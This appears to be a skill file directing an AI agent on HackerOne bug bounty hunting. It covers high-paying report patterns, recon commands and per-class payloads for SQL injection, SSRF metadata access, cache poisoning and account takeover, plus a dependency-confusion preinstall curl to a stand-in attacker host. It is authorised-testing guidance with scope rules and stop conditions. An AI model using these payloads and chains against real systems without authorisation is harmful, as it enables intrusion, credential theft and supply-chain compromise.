---
name: top100-paid-hunter
description: "Curated database of $10k+ HackerOne reports: real-world patterns for high-impact bug hunting."
---

# top100-paid-hunter

## 1. IMPACT GATE

The impact gate must be evaluated immediately upon discovering a potential vulnerability. The skill must force the agent to triage findings BEFORE writing them up.

**CRITICAL INSTRUCTION:** Abort the engagement on a finding the moment it lands in REJECT — no write-up, no further exploitation.

### ACCEPT (Proceed to Exploitation and Reporting)
- Pre-auth or low-priv Remote Code Execution (RCE).
- Full account takeover (ATO) without significant user interaction.
- Server-Side Request Forgery (SSRF) reaching cloud metadata or internal services.
- SQL Injection (SQLi) with proven data extraction capabilities.
- Insecure Direct Object Reference (IDOR) exposing other tenants' PII, financial, or health data.
- Authentication bypass on production systems.
- Exposed administrative panels (Jenkins, Kubernetes, Grafana, Zeppelin, Spring Actuator, SVN, GraphQL admin).
- Leaked long-lived credentials with verified scope and impact.
- Path traversal reading `/etc/passwd`-tier secrets or application source code.
- Deserialization vulnerabilities leading to code execution.
- Stored Cross-Site Scripting (XSS) bypassing Content Security Policy (CSP) on sensitive pages (auth/payment).
- Web Cache Poisoning persisting across users and delivering malicious payloads.

### REJECT (Abort, Do Not Report)
- Self-XSS (requires the victim to paste code).
- Reflected XSS without a sensitive context or viable delivery mechanism.
- IDOR on already-public data (e.g., public profile pictures).
- Cross-Site Request Forgery (CSRF) on non-state-changing endpoints (e.g., logout).
- Missing security headers alone (e.g., Strict-Transport-Security, X-Frame-Options).
- Software version disclosure (e.g., "nginx 1.18.0 exposed").
- Clickjacking on non-authentication/non-sensitive pages.
- Rate-limit-only findings (e.g., brute-forcing login without bypassing lockout).
- Theoretical SSRF with no reachable internal target or impact demonstration.
- "Leaked" public keys (e.g., PGP public keys).
- Denial of Service (DoS) via legitimate API usage (e.g., requesting a large file).
- Open redirects without a chained OAuth/SSO token theft impact.

---

## 2. PATTERN EXTRACTION FROM TOP100PAID.md

The 100 highest-paid HackerOne reports demonstrate recurring structural vulnerabilities. These are not edge-case bugs, but systemic architectural flaws.

### Target Archetype Bias
Approximately 30 of the top 100 reports are against GitLab, which means the patterns are concentrated in complex DevOps platforms with file-processing and project-import pipelines. The patterns transfer to similar architectures (GitHub, Bitbucket, Jenkins, self-hosted SCM, CI/CD platforms) but should be applied with weaker priors against simpler web apps. Clusters that are highly concentrated around GitLab include **RCE via File Processing & Imports** and **Stored XSS with CSP Bypass & Cache Poisoning**.

### RCE via File Processing & Imports (15 reports / 15%)
- **Why it paid:** Systems processing complex file formats (images, archives, markdown, video metadata) or executing project imports operate pipelines on attacker-controlled data, often with elevated privileges, failing to sandbox underlying parsers.
- **Recurring Sinks/Sources:** ExifTool (CVE-2021-22204 style), Kramdown (unsafe options), Nokogiri, libarchive (symlink traversal), GitLab Project BulkImports, Office Open XML XXE.
- **Target Archetypes:** DevOps platforms, code hosting platforms, social media, gaming/consoles.
- **Cross-Reference Source:** see #5 (Remote Command Execution via Github import), #6 (RCE via the DecompressedArchiveSizeValidator and Project BulkImports), #8 (Arbitrary file read via the bulk imports UploadsPipeline), #13 (RepositoryPipeline allows importing of local git repos), #18 (Arbitrary file read via the UploadsRewriter when moving and issue), #21 (RCE when removing metadata with ExifTool), #22 (RCE via unsafe inline Kramdown options when rendering certain Wiki pages), #24 (Steal private objects of other projects via project import), #25 (Private objects exposed through project import), #31 (Arbitrary file read during project import), #38 (file read on MCS servers via supplying a QCOW2 image with external backing file), #55 (Git flag injection - local file overwrite to remote code execution), #56 (Local files could be overwritten in GitLab, leading to remote command execution), #61 (Path traversal, to RCE), #62 (Path traversal in Nuget Package Registry).

### Exposed Services & Leaked Credentials (12 reports / 12%)
- **Why it paid:** Direct administrative access bypassing front-door authentication due to misconfigured microservices, internal route exposure, or token leakage in public repositories.
- **Recurring Sinks/Sources:** Spring Actuator (`/actuator/env`), Jenkins script consoles, Kubernetes API (`/api/v1/namespaces`), Apache Zeppelin notebooks, Grafana dashboards, GitHub Personal Access Tokens (PATs) in `.env` files or commit histories.
- **Target Archetypes:** High-growth tech companies, microservice architectures, CI/CD pipelines.
- **Cross-Reference Source:** see #1 (Github access token exposure), #2 (API access to Phabricator on code.uberinternal.com from leaked certificate in git repo), #4 (Незащищённый экземпляр Zeppelin), #9 (Exposed Kubernetes API - RCE/Exposed Creds), #15 (Potential pre-auth RCE on Twitter VPN), #27 (Oracle Webcenter Sites administrative and hi-privilege access available directly from the internet), #37 (Open prod Jenkins instance), #41 (Leaked JFrog Artifactory username and password exposed on GitHub), #51 (Spring Actuator endpoints publicly available and broken authentication), #52 (Internal Access to Hackerone confluence Docs), #68 (Access to multiple production Grafana dashboards), #83 (Publicly exposed SVN repository, ht.pornhub.com).

### Authorization, IDOR & Business Logic (16 reports / 16%)
- **Why it paid:** Vertical/horizontal privilege escalation and unauthenticated data manipulation due to flawed state or broken checks.
- **Recurring Sinks/Sources:** Object imports, API parameter modification, token misuse, logic race conditions.
- **Target Archetypes:** E-commerce, platforms with complex RBAC, bug bounty platforms.
- **Cross-Reference Source:** see #14 (access list owner can escalate his role to the highest roles), #19 (Getting all the CD keys of any game), #33 (Ability to bypass partner email confirmation to take over any store given an employee email), #34 (Delete anyone's content spotlight remotely.), #39 (Incorrect authorization to the intelbot service leading to ticket information), #40 (Пользователь с ролью наблюдателя может создавать ключи доступа для очереди сообщений), #42 (Groups module can halt chain when handling a proposal with malicious group weights), #57 (Project Template functionality can be used to copy private project data), #59 (An attacker can run pipeline jobs as arbitrary user), #60 (Account Takeover via Authentication Bypass in TikTok Account Recovery), #64 (Exfiltrate and mutate repository and project data through injected templated service), #65 (IDOR to add secondary users in www.paypal.com/businessmanage/users/api/v1/users), #66 (Ability to DOS any organization's SSO and open up the door to account takeovers), #75 (Double Payout via PayPal), #81 (Arbitrary Read of Another Users private repository without Authorization), #90 (Using gossip to drain miner wallets).

### Information Disclosure, Path Traversal & Misc Auth (10 reports / 10%)
- **Why it paid:** Direct leakage of files, memory contents, or internal structures leading to sensitive data compromise.
- **Recurring Sinks/Sources:** Unfiltered proxy responses, zip exports, debugging interfaces, misconfigured middleware.
- **Target Archetypes:** High-growth tech companies, shared hosting environments.
- **Cross-Reference Source:** see #54 (DOS via Mutation Aliasing in GraphQL Account Recovery Phone Number Verification API), #69 (touch.mail.ru / e.mail.ru memory content disclosure), #70 (gitlab-workhorse bypass in Gitlab::Middleware::Multipart allowing files in `allowed_paths` to be read), #72 (RCE on shared.mail.ru due to "widget" plugin), #74 (Partial disclosure of report activity through new "Export as .zip" feature), #77 (Information Disclosure in /skills call), #85 (read new emails from any inbox IOS APP in notification center), #86 (Authentication bypass on gist.github.com through SSH Certificates), #87 (CSRF protection bypass in GitHub Enterprise management console), #91 (OneLogin authentication bypass on WordPress sites).

### Information Disclosure via GraphQL & API Logic (6 reports / 6%)
- **Why it paid:** IDOR and mass data leakage facilitated by GraphQL's introspective nature and complex, deeply nested authorization logic.
- **Recurring Sinks/Sources:** GraphQL global IDs (`gid:///` pattern), alias-batching mutations bypassing rate limits, missing field-level authorization resolvers, verbose error messages leaking internal states.
- **Target Archetypes:** Modern web applications, payment processors, bug bounty platforms.
- **Cross-Reference Source:** see #10 (The /reports/:id.json endpoint discloses potentially sensitive user attributes), #12 (Disclosing PolicyPageAssetGroup in Private Programs via /graphql), #48 (An attacker can can view any hacker email via /SaveCollaboratorsMutation), #49 (IDOR - Delete all Licenses and certifications from users account using CreateOrUpdateHackerCertification GraphQL query), #50 (Internal attachments can be exported via "Export as .zip" feature), #58 (JSON serialization of any Project model results in all Runner tokens being exposed).

### Account Takeover (ATO) & Auth Bypass (5 reports / 5%)
- **Why it paid:** Complete compromise of victim accounts without interaction due to flawed state management, broken cryptography, or misconfigured identity providers.
- **Recurring Sinks/Sources:** Password reset token entropy/leakage, Host header injection, OAuth callback manipulation (state parameter bypass), session fixation, JSON Web Token (JWT) signature bypasses (`"alg": "none"` or weak secrets).
- **Target Archetypes:** E-commerce, payment gateways, Single Sign-On (SSO) providers.
- **Cross-Reference Source:** see #3 (Account Takeover via Password Reset without user interactions), #17 (Account takeover via leaked session cookie), #32 (Token leak in security challenge flow allows retrieving victim's PayPal email), #47 (Mass Accounts Takeover Without any user Interaction at https://app.taxjar.com/), #84 (Hacker can bypass 2FA requirement and reporter blacklist through embedded submission form).

### Stored XSS with CSP Bypass & Cache Poisoning (7 reports / 7%)
- **Why it paid:** Execution of JavaScript on high-value origins (e.g., `paypal.com/signin`) allowing for session hijacking, achieved by bypassing strict CSPs or poisoning shared caches.
- **Recurring Sinks/Sources:** Markdown rendering pipelines, SVG upload sanitization failures, unkeyed HTTP headers (`X-Forwarded-Host`, `X-Original-URL`) reflecting in CDN caches.
- **Target Archetypes:** Payment processors, SaaS platforms with rich text inputs.
- **Cross-Reference Source:** see #16 (Bypass for #488147 enables stored XSS on https://paypal.com/signin again), #26 (Stored XSS on https://paypal.com/signin via cache poisoning), #30 (Stored XSS in markdown via the DesignReferenceFilter), #43 (Stored XSS via Kroki diagram), #44 (Stored XSS in Notes), #45 (New /add_contacts /remove_contacts quick commands susseptible to XSS), #46 (XSS in ZenTao integration affecting self hosted instances without strict CSP).

### SQL Injection & SSRF (5 reports / 5%)
- **Why it paid:** Direct backend data extraction or internal network pivoting.
- **Recurring Sinks/Sources:** Legacy PHP endpoints, URL fetchers for link previews, export integrations, webhook configurations.
- **Target Archetypes:** Gaming clients, cloud storage providers, ride-sharing platforms.
- **Cross-Reference Source:** see #11 (SQL Injection in report_xml.php through countryFilter[] parameter), #29 (Full Response SSRF via Google Drive), #36 (Time-Based SQL injection at city-mobil.ru), #71 (SQL injection at fleet.city-mobil.ru), #73 (SSRF on project import via the remote_attachment_url on a Note).

### Dependency Confusion & Deserialization RCE (5 reports / 5%)
- **Why it paid:** Supply chain execution on build servers or unsafe object initialization leading to shell access.
- **Recurring Sinks/Sources:** Public npm/PyPI registry resolution prioritizing higher versions over internal registries, PHP `unserialize()`, Java `ObjectInputStream`, Node.js `node-serialize`.
- **Target Archetypes:** Global tech enterprises, media streaming platforms.
- **Cross-Reference Source:** see #7 (RCE via npm misconfig -- installing internal libraries from the public registry), #20 ([phpobject in cookie] Remote shell/command execution), #63 (Arbitrary Code Execution via npm misconfiguration), #79 (Deserialization of untrusted data at https://www.redtube.com/media/hls?s=data), #89 (uber.com may RCE by Flask Jinja2 Template Injection).

### Out-of-Scope Cluster: Native/Console Memory Corruption (19 reports / 19%)
Approximately 19 of the top 100 reports are PlayStation, console, or native binary bugs requiring binary analysis skill (buffer overflows, use-after-free, logic crashes in game engines or custom script runtimes). Skip these unless explicitly working a console or low-level binary program.

---

## 2.5 READING THE PROGRAM BRIEF

Before conducting any reconnaissance, thoroughly review the HackerOne program brief.
- Always read the H1 program scope before any recon. Out-of-scope assets are violations, not bonuses.
- Identify "in-scope" vs "out-of-scope" subdomains, IP ranges, and asset types.
- Identify program-specific rule prohibitions (automated scanning, account creation limits, social engineering, physical, DoS).
- Identify VDP vs paid program — VDPs do not pay regardless of severity.
- Identify disclosure timeline expectations.
- Note any "safe harbor" language and any explicit account-creation rules (some programs require `@wearehackerone.com` email aliases).

---

## 3. RECONNAISSANCE PLAYBOOK

Concrete commands and techniques to systematically surface candidates for high-paying bug classes.

### 3.1 Subdomain Enumeration
Rely on passive reconnaissance to map the perimeter without triggering WAF blocks.
```bash
# Execute passive tools concurrently
amass enum -passive -d target.com -o amass_out.txt
subfinder -d target.com -all -silent -o subfinder_out.txt
assetfinder --subs-only target.com > assetfinder_out.txt
chaos-client -d target.com -o chaos_out.txt
# Parse crt.sh for certificate transparency logs
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > crtsh_out.txt

# Deduplicate and format, then resolve actively with dnsx
cat amass_out.txt subfinder_out.txt assetfinder_out.txt chaos_out.txt crtsh_out.txt | sort -u | dnsx -silent > all_subdomains.txt
```

### 3.2 Asset Triage & Priority Targeting
Analyze live hosts and categorize by technology and response codes.
```bash
# Resolve live hosts and fetch headers
cat all_subdomains.txt | httpx -title -tech-detect -status-code -follow-redirects -threads 50 -o live_hosts_full.txt

# Active crawling of in-scope targets
cat all_subdomains.txt | katana -silent -jc -kf all > katana_urls.txt

# Templated vulnerability scanning for misconfigurations and CVEs
nuclei -l all_subdomains.txt -t cves/ -t exposures/ -t misconfiguration/ -o nuclei_results.txt

# Extract priority-1 targets (Admin, Internal, Legacy, specific stacks)
grep -iE "jenkins|grafana|kibana|zeppelin|actuator|admin|staging|legacy|v1|internal|api|corp|dev|test" live_hosts_full.txt > priority_targets.txt
grep -iE "spring|java|kubernetes|gitlab|jira|confluence" live_hosts_full.txt >> priority_targets.txt
```
*Flag legacy, v1, internal, and admin hostnames as priority-1. Attack surfaces here are typically unmaintained.*

### 3.3 JS Bundle Analysis
Extract API routes, internal references, and hardcoded secrets.
```bash
# Extract JS endpoints
python3 LinkFinder/linkfinder.py -i "https://target.com/app.bundle.js" -o cli > endpoints.txt

# High-entropy secret hunting via regex
curl -s "https://target.com/app.bundle.js" | grep -oE "(sk_live_[a-zA-Z0-9]+|AKIA[0-9A-Z]{16}|ghp_[a-zA-Z0-9]{36})"

# Deep parsing of JS AST
cat js_files.txt | xargs -I {} jsluice urls {}
cat js_files.txt | xargs -I {} jsluice secrets {}
```

### 3.4 GitHub Dorking (Target Organization)
Search for leaked tokens and dependency confusion candidates.
```github-search
# The following patterns are entered into the GitHub web search bar
org:TargetOrg filename:.env
org:TargetOrg filename:config.yml "password"
org:TargetOrg "BEGIN RSA PRIVATE KEY"

# Dependency confusion candidate hunting
org:TargetOrg filename:package.json
org:TargetOrg filename:pom.xml
org:TargetOrg filename:requirements.txt
```
*Look for internal-scope packages (e.g., `"@target-internal/core": "1.0.0"`) and verify if they exist on the public registry.*

### 3.5 Wayback Machine / Archive.org
Historical data reveals deprecated endpoints that often lack modern security controls.
```bash
# Fetch historical URLs
echo "target.com" | waybackurls > wayback_urls.txt
echo "target.com" | gau >> wayback_urls.txt

# Filter for sensitive extensions and potentially vulnerable parameters
cat wayback_urls.txt | grep -iE "\.php|\.json|\.xml|\.bak|\.old" | sort -u > archive_sensitive.txt
cat wayback_urls.txt | grep -iE "\?id=|\?url=|\?file=|\?path=|\?redirect=" | sort -u > archive_params.txt
```

### 3.6 Mobile App Extraction
Many top reports originated from mobile-only endpoints that web pentesters never saw.
```bash
# Decompile Android APK
apktool d target_application.apk -o decompiled_app

# Extract hardcoded strings and API endpoints
grep -ri "https://" decompiled_app/ | grep "api"
grep -ri "token" decompiled_app/res/values/strings.xml

# Dynamic instrumentation (Frida) to bypass SSL pinning
frida -U -f com.target.app -l ssl_pinning_bypass.js --no-pause
```
*Flag mobile-only endpoints as priority-1.*

### 3.7 GraphQL Introspection
Identify hidden schemas and global ID patterns.
```bash
# Attempt full introspection
curl -X POST https://api.target.com/graphql -H "Content-Type: application/json" -d '{"query":"{ __schema { types { name fields { name } } } }"}' | jq

# Search for the gid:// pattern indicating Global IDs
grep -i "gid://" introspection_result.json
```

### 3.8 Cloud Asset Enumeration
Exposed buckets and registries lead to high-impact data breaches.
```bash
# Test S3 bucket public access
aws s3 ls s3://target-corp-assets --no-sign-request
aws s3 cp test.txt s3://target-corp-assets/ --no-sign-request

# Enumerate public ECR/GCR images
# Note: ECR enumeration requires AWS credentials (post-leak step).
aws ecr describe-repositories --registry-id <account-id> --region <region>
```

### 3.9 Traffic Diffing (Burp Suite)
Identify Authorization/PrivEsc via differential analysis.
1. Capture state-changing requests as Account A (Attacker, Tenant 1).
2. Replay with session tokens of Account B (Victim, Tenant 1) -> Horizontal Esc.
3. Replay with session tokens of Account C (Attacker, Tenant 2) -> Cross-Tenant Esc.
4. Drop `user_id` or `tenant_id` parameters entirely to test for default-allow states.

---

## 4. PER-CLASS TESTING MATRIX

### 4.1 RCE: File Processing & SCM Imports
- **Surface:** Every endpoint ingesting user-supplied archives (ZIP, TAR), images (JPG, PNG, SVG), markdown, office docs, video metadata. Any "import from URL" or "import from archive" feature.
- **Trigger:**
  - **ExifTool (CVE-2021-22204):** Upload an image with a DjVu payload in the metadata.
  - **Kramdown:** Inject unsafe inline options in markdown fields: `{::options template="..." /}`. The exact exploit depends on the Kramdown version and template resolution path.
  - **Archive Traversal:** Upload a TAR file containing a symlink pointing to `/etc/passwd`.
  - **Office Open XML XXE:** Inject XXE payloads into `[Content_Types].xml` within a `.docx` archive.
  - **SCM Import:** Provide a URL pointing to a malicious Git repository designed to exploit `git clone` options or inject flags.
  - **QCOW2 Upload:** Supply a QCOW2 image with an external backing file pointing to local disk.
- **Amplification:** Escalate Arbitrary File Read to RCE by reading configuration files (`database.yml`, `.env`), extracting database credentials, or reading `.git/config` for source code access.
- **False Positives:** Non-executable file uploads safely stored in an isolated S3 bucket and served from an untrusted sandbox domain (REJECT).

### 4.2 RCE: Dependency Confusion
- **Surface:** Target's `package.json`, `pom.xml`, or `requirements.txt` found in public repos or client-side bundles exposing internal dependency names.
- **Trigger:** Pull public repos to identify internal packages (e.g., `@targetcorp/internal-utils`). Check if the exact name exists on the public npm/PyPI registry.
- **Amplification:** Register the missing internal package on the public registry with an artificially high version (e.g., `99.9.9`). Include a benign callback in the `preinstall` script (e.g., DNS resolution to a Collaborator payload) to confirm execution during the target's CI/CD build process. Document the chain.
- **False Positives:** The target uses a properly configured private registry mirror (e.g., Artifactory, Nexus) that strictly rejects upstream public packages for internal scopes.
- **Critical Action:** Never publish actual malware. A DNS pingback is sufficient proof of concept.

### 4.3 Account Takeover (ATO): Password Reset & Auth Logic
- **Surface:** Password reset forms, account recovery flows, OAuth integrations.
- **Trigger:**
  - **Token Entropy:** Request 50 reset tokens and analyze for predictable sequencing, timestamp usage, or weak cryptography.
  - **Host Header Injection:** Send `Host: attacker.com` in the reset request. If the email contains a link pointing to `attacker.com`, the token will leak when the victim clicks.
  - **Parameter Pollution:** Submit `email=victim@target.com&email=attacker@target.com`. Does the token go to the attacker?
  - **Token Reuse & Race Conditions:** Attempt to use the same reset token multiple times or trigger race conditions between request generation and consumption.
  - **OAuth State Bypass:** Drop or manipulate the `state` parameter in OAuth flows to test for CSRF leading to account linking (Session Fixation).
- **Amplification:** Use the stolen or injected token to reset the victim's password and achieve full ATO.
- **False Positives:** Host header is reflected in the email, but the token is securely bound to the specific host or immediately invalidated.

### 4.4 Information Disclosure: GraphQL Authorization
- **Surface:** All GraphQL endpoints (`/graphql`, `/api/graphql`).
- **Trigger:**
  - **Introspection:** Run full schema introspection to map internal nodes.
  - **Global ID (GID) Enumeration:** If objects use IDs like `gid:///hackerone/PolicyPageAssetGroup/123`, increment or swap IDs to access other users' objects.
  - **Alias Batching:** Use alias mutations to brute-force OTPs or bypass rate limits by submitting 100 queries in a single HTTP request.
  - **Fragment Smuggling:** Request nested protected fields inside GraphQL fragments to bypass top-level resolver authorization checks.
- **Amplification:** Extract sensitive PII, internal project data, or administrative tokens from unauthorized nodes.
- **False Positives:** Accessing nodes that are intended to be public (e.g., public profile information).

### 4.5 Stored XSS & Cache Poisoning
- **Surface:** Rich text inputs, markdown parsers, profile fields, endpoints cached by CDNs (Cloudflare, Fastly).
- **Trigger:**
  - **Cache Poisoning:** Identify unkeyed HTTP headers (e.g., `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Original-URL`) that reflect in the response. Inject a payload like `X-Forwarded-Host: attacker.com"><script src="..."></script>`. Send the request rapidly to poison the CDN cache.
  - **CSP Bypass:** Identify JSONP endpoints or open redirects within the allowed CSP domains (e.g., `*.target.com`). Chain these to execute arbitrary JavaScript despite strict policies.
- **Amplification:** Ensure the payload executes for other users visiting the URL. Target auth pages (`/signin`) or payment pages to extract session cookies or payment tokens.
- **False Positives:** Reflection occurs, but the CDN response sets `Cache-Control: private` or `no-cache`, preventing exploitation against other users.

### 4.6 Server-Side Request Forgery (SSRF)
- **Surface:** Webhooks, PDF generators, image fetchers, link previews, export integrations, SCM project imports.
- **Trigger:** Supply a URL pointing to internal infrastructure.
  - AWS: `http://169.254.169.254/latest/meta-data/`
  - GCP: `http://metadata.google.internal/computeMetadata/v1/`
  - Localhost: `http://127.0.0.1:22`, `http://localhost:6379`
  - Bypasses: `http://0x7f000001`, `http://[::]`, `http://127.1`
  - DNS Rebinding: `rbndr.us`, `lock.cmpxchg8b.com`
  - Protocol Smuggling: `gopher://` for Redis, MySQL, SMTP
  - Local File Read: `file://` if the URL parser allows it
  - URL Parser Confusion: `http://attacker.com#@127.0.0.1/`, `http://attacker.com@127.0.0.1/`
- **Amplification:** Extract cloud IAM credentials from the metadata service. Use these credentials via the AWS CLI to access internal S3 buckets or list EC2 instances.
- **False Positives:** Blind SSRF (DNS ping only) with no reachable internal targets or response extraction (REJECT).

### 4.7 Exposed Services & Leaked Credentials
- **Surface:** High-value ports and paths discovered during automated recon.
- **Trigger:**
  - **Spring Actuator:** Probe `/actuator/env`, `/actuator/heapdump`, `/actuator/gateway/routes`.
  - **Jenkins:** Probe `/jenkins/script` for Groovy script execution.
  - **Kubernetes:** Probe `/api/v1/namespaces`, `/api/v1/secrets`.
  - **Version Control:** Probe `/.git/config`, `/.svn/wc.db`.
  - **Zeppelin:** Unauthenticated access to Apache Zeppelin notebook execution.
- **Amplification:** Extract environment variables containing database passwords, or execute arbitrary code directly via Jenkins script console or Kubernetes pod execution.
- **False Positives:** Exposed endpoints that return 401 Unauthorized, require valid authentication, and have no default credentials.

### 4.8 SQL Injection (SQLi)
- **Surface:** Legacy API endpoints, export features, complex search filters, sorting parameters (e.g., `?sort=id ASC`).
- **Trigger:** 
  - Inject boolean logic: `id=1' AND 1=1--` vs `id=1' AND 1=0--`.
  - Inject time delays: `id=1'; WAITFOR DELAY '0:0:5'--`, `id=1' AND SLEEP(5)--`.
- **Amplification:** Prove data extraction capabilities by resolving current user details, database version (`@@version`), or identifying table names. Do not dump the entire database.
- **False Positives:** Syntax errors reflecting in responses without ability to alter the query logic or extract data.

---

## 5. CHAINING

To achieve $10k-$50k tier impact, individual vulnerabilities must often be chained together. The agent MUST attempt at least one chain before reporting a medium-impact finding, but MUST strictly adhere to the Stop Conditions below.

**Stop Conditions (Non-Negotiable):**
- **SSRF Chain Proof:** A single successful read of `/latest/meta-data/iam/security-credentials/`. STOP. Do not use the credentials.
- **XSS to ATO Proof:** Exfiltrate a single session token to an attacker-controlled listener. STOP. Do not use the token to access the victim account.
- **IDOR/GraphQL Proof:** Extract a maximum of 5 records belonging to a test account. STOP. Do not dump the database.
- **LFI/Path Traversal Proof:** Read `/etc/passwd` or a single configuration file (e.g., `database.yml`). STOP. Do not use extracted credentials for lateral movement.

1. **SSRF → Cloud Metadata:** Escalate blind SSRF to read AWS metadata. Demonstrate the chain is possible with the MINIMUM number of requests needed for proof. Stop after the proof. Do not enumerate further, do not download data, do not access additional resources.
2. **Stored XSS → CSP Bypass → Session Theft on Auth Domain:** Bypass CSP to execute on `login.target.com`. Demonstrate the chain is possible with the MINIMUM number of requests needed for proof. Stop after the proof. Do not enumerate further, do not download data, do not access additional resources.
3. **IDOR → Mass Enumeration Potential:** Automate IDOR via GraphQL alias batching. Demonstrate the chain is possible with the MINIMUM number of requests needed for proof. Stop after the proof. Do not enumerate further, do not download data, do not access additional resources.
4. **Open Redirect → OAuth Callback → Token Theft:** Chain open redirect with an OAuth flow to steal access tokens. Demonstrate the chain is possible with the MINIMUM number of requests needed for proof. Stop after the proof. Do not enumerate further, do not download data, do not access additional resources.
5. **Path Traversal → Config File Read:** Escalate path traversal to read database credentials. Demonstrate the chain is possible with the MINIMUM number of requests needed for proof. Stop after the proof. Do not enumerate further, do not download data, do not access additional resources.
6. **Subdomain Takeover → Cookie Scope:** Take over a forgotten subdomain and set a top-level cookie. Demonstrate the chain is possible with the MINIMUM number of requests needed for proof. Stop after the proof. Do not enumerate further, do not download data, do not access additional resources.
7. **File Upload → SVG XSS → SSRF (PDF Generator):** Upload an SVG containing XSS, trigger PDF generation. Demonstrate the chain is possible with the MINIMUM number of requests needed for proof. Stop after the proof. Do not enumerate further, do not download data, do not access additional resources.
8. **Auth Bypass → Exposed Admin Panel:** Bypass authentication to access a Jenkins/Grafana dashboard. Demonstrate the chain is possible with the MINIMUM number of requests needed for proof. Stop after the proof. Do not enumerate further, do not download data, do not access additional resources.
9. **Dependency Confusion → Build Server Access:** Achieve code execution on a CI/CD server via DNS pingback. Demonstrate the chain is possible with the MINIMUM number of requests needed for proof. Stop after the proof. Do not enumerate further, do not download data, do not access additional resources.
10. **Cache Poisoning → API Route Hijacking:** Poison an API cache to serve attacker-controlled JSON. Demonstrate the chain is possible with the MINIMUM number of requests needed for proof. Stop after the proof. Do not enumerate further, do not download data, do not access additional resources.

---

## 6. ETHICS & SCOPE

These constraints are non-negotiable and must be adhered to at all times.

- **Test only assets explicitly in HackerOne program scope:** Out-of-scope assets are not "bonus", they are strict violations.
- **Use only attacker-controlled accounts:** Do not access real users' data beyond minimum proof necessary.
- **Stop exploiting the moment impact is confirmed:** Document the vulnerability, do not pivot further into internal networks or databases.
- **Prohibited Actions:** No persistence mechanisms, no data exfiltration at scale, no malware deployment, no Denial of Service (DoS), no social engineering of staff.
- **Honor program-specific rules:** Some programs ban automated scanning, some ban specific subdomains, some require specific disclosure timelines. Adhere to the program brief.

---

## 7. REPORT TEMPLATE

Use this exact structure when generating HackerOne reports.

```markdown
**Title:** [Impact-led, e.g., Pre-auth RCE on api.target.com via dependency confusion]

**Summary:**
[2-3 sentences. State the business impact first. E.g., The application is vulnerable to dependency confusion on the internal package `@target/utils`. This allows an unauthenticated attacker to achieve Remote Code Execution on the build server, compromising the integrity of the CI/CD pipeline and potentially accessing source code and internal credentials.]

**Steps to Reproduce:**
[Use numbered lists. Specify distinct accounts used (e.g., Account A attacker, Account B victim).]
1. As Account A (Attacker), identify the internal package `@target/utils` referenced in `https://target.com/package.json`.
2. Register the package `@target/utils` on the public npm registry with a version of `99.99.99`.
3. Include a benign preinstall script in the malicious package: `"preinstall": "curl http://attacker.collaborator.net/ping"`
4. Wait for the target's CI/CD pipeline to execute during a normal build cycle.
5. Observe the HTTP request reaching the Collaborator server, confirming code execution on the build runner.

**PoC:**
\`\`\`json
// Malicious package.json
{
  "name": "@target/utils",
  "version": "99.99.99",
  "scripts": {
    "preinstall": "curl http://attacker.collaborator.net/ping"
  }
}
\`\`\`

**Impact:**
[What data is exposed, how many users theoretically affected, what an attacker gains in concrete terms.]
An unauthenticated attacker can execute arbitrary commands on the deployment servers. This grants access to sensitive environment variables, enables internal network pivoting, and provides the ability to modify production deployments, leading to potential data breaches and service disruption.

**Severity:**
- **CVSS 3.1 Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (10.0)
- **Business Impact:** Full compromise of the application infrastructure, leading to potential data breaches of customer PII and disruption of services.

**Supporting Material:**
Screenshots and a screen recording (under 2 minutes) are effectively required by H1 triagers. Include both.

**References:**
Link to relevant CVEs, public writeups, or vendor advisories that establish the bug class. Triagers move faster on familiar patterns.

**Suggested Remediation:**
[Provide a data-layer or architectural fix, not just a WAF rule.]
Configure the package manager (e.g., npm, yarn) to explicitly route requests for internal scopes (like `@target/*`) to the private registry only, rejecting any upstream resolutions from the public registry. 

**Disclosure Timeline Expectation:**
Following standard coordinated disclosure practices, allowing 90 days for remediation before public discussion.
```
